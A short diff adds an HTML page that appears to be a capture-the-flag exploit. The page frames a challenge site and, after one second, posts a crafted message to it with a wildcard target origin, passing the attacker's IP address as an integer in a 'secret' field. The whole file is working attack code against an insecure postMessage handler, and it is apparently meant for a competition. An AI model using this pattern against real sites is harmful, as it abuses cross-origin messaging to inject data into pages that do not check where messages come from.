@@ -1,0 +1,10 @@
+<!DOCTYPE html>
+<html>
+<iframe id="i" src="http://challenges.cybermouflons.com:xxxxx" width="800" height="800"></iframe>
+<script>
+    const ip2int = (ip) => ip.split('.').reduce((ipInt, octet) => (ipInt << 8) + parseInt(octet, 10), 0) >>> 0
+    const MY_IP = 'xxx.xxx.xxx.xxx'
+
+    setTimeout(() => i.contentWindow.postMessage({ secret: ip2int(MY_IP), prompt: 'nothing' }, '*'), 1000)
+</script>
+</html>
